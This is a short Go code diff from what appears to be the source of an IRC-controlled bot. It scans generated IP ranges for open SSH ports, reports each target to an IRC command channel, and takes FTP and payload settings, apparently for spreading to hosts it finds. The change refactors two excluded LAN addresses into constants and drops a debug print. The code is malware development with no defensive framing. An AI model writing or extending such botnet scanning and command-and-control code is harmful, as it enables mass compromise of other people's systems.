@@ -36,6 +36,10 @@ const (
 
 	//Private ip
 	priv = "192." //192.168.0.0 - 192.168.255.255
+
+	//Black list ip
+	bl1 = "192.168.1.1:22"
+	bl2 = "192.168.1.16:22"
 )
 
 func GenRange(max, min int) string {
@@ -145,12 +149,9 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 			ptrTarget := &target
 			turnRange := CheckPort(*ptrTarget)
 
-			//Blacklist IP.
-			if target == "192.168.1.1:22" || target == "192.168.1.16:22" {
+			if target == bl1 || target == bl2 {
 				break
 			}
-
-			fmt.Println(target)
 
 			if turnRange == "" {
 				IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :"+target+" SSH not found.")
